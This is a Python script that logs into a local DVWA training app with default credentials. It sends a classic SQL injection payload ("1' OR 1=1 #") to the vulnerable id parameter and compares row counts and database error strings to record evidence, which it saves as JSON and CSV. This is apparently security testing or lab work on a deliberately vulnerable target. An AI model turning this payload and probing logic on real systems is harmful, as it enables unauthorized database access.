import re
import json
import csv
from datetime import datetime, timezone
from pathlib import Path
import requests


BASE_URL = "http://localhost:4280"

USERNAME = "admin"
PASSWORD = "password"


def login_to_dvwa(session):
    """
    Log in to DVWA and keep the authenticated session.
    """

    login_url = f"{BASE_URL}/login.php"
    response = session.get(login_url)

    if response.status_code != 200:
        raise Exception("Could not open DVWA login page.")

    # DVWA normally uses a CSRF token called user_token
    token_match = re.search(
        r"name=['\"]user_token['\"] value=['\"]([^'\"]+)['\"]",
        response.text
    )

    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login"
    }

    if token_match:
        login_data["user_token"] = token_match.group(1)

    response = session.post(
        login_url,
        data=login_data,
        allow_redirects=True
    )

    if "Logout" not in response.text:
        raise Exception(
            "Login failed. Check DVWA username/password."
        )

    print("DVWA login successful.")


def collect_sql_injection_evidence():
    """
    Test the DVWA SQL Injection page and collect runtime evidence.
    """

    session = requests.Session()
    login_to_dvwa(session)
    session.cookies.set("security", "low")
    target_url = f"{BASE_URL}/vulnerabilities/sqli/"

 
    # 1. Normal request
    normal_params = {
        "id": "1",
        "Submit": "Submit"
    }

    normal_response = session.get(
        target_url,
        params=normal_params
    )

    print("\nNormal request completed.")

    
    # 2. SQL Injection request
    injection_payload = "1' OR 1=1 #"

    injection_params = {
        "id": injection_payload,
        "Submit": "Submit"
    }

    injection_response = session.get(
        target_url,
        params=injection_params
    )

    print("Injection request completed.")


    # 3. Compare responses
    normal_users = normal_response.text.count("First name:")
    injected_users = injection_response.text.count("First name:")

    runtime_evidence = injected_users > normal_users

    database_error_detected = (
        "SQL syntax" in injection_response.text
        or "MariaDB" in injection_response.text
        or "mysql" in injection_response.text.lower()
    )

    evidence = {
        "source_code_evidence": False,
        "runtime_evidence": runtime_evidence,
        "parameter": "id",
        "database_error_detected": database_error_detected,
        "normal_result_count": normal_users,
        "injected_result_count": injected_users,
        "payload_used": injection_payload
    }

    return evidence


def save_evidence(evidence):
    """
    Save evidence as both JSON and CSV.
    """

    timestamp = datetime.now(timezone.utc)
    run_id = timestamp.strftime("%Y%m%d_%H%M%S")

    artifacts_dir = Path("artifacts") / "runs"
    artifacts_dir.mkdir(parents=True, exist_ok=True)

    # Add metadata
    evidence["run_id"] = run_id
    evidence["timestamp_utc"] = timestamp.isoformat()
    evidence["target"] = BASE_URL
    evidence["finding_type"] = "sql_injection"

   
    # Save JSON
    json_file = artifacts_dir / f"{run_id}_runtime_evidence.json"

    with json_file.open("w", encoding="utf-8") as f:
        json.dump(evidence, f, indent=2)

    # Save CSV for Excel
    csv_file = artifacts_dir / "runtime_evidence_results.csv"

    file_exists = csv_file.exists()

    with csv_file.open(
        "a",
        newline="",
        encoding="utf-8"
    ) as f:

        writer = csv.DictWriter(
            f,
            fieldnames=evidence.keys()
        )

        if not file_exists:
            writer.writeheader()

        writer.writerow(evidence)

    return json_file, csv_file


if __name__ == "__main__":

    evidence = collect_sql_injection_evidence()

    json_file, csv_file = save_evidence(evidence)

    print("\nRUNTIME EVIDENCE RESULT")

    for key, value in evidence.items():
        print(f"{key}: {value}")

    print(f"\nJSON evidence saved to: {json_file}")
    print(f"Excel/CSV evidence saved to: {csv_file}")